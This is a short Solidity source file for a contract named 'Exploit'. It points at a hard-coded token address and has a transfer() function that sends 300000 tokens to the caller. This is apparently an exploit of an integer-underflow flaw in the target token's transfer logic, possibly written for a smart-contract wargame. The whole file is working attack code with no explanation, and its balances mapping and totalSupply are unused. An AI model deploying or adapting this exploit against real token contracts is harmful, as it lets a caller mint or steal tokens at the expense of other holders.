// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Token {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Exploit {
    mapping(address => uint256) balances;
    uint256 public totalSupply;
    address TokenAddress = 0x190Fc0414d7477666fb958ffFefC0AA92AfEa371;
    Token token = Token(TokenAddress);

    function transfer() public {
        token.transfer(msg.sender, 300000);
    }
}
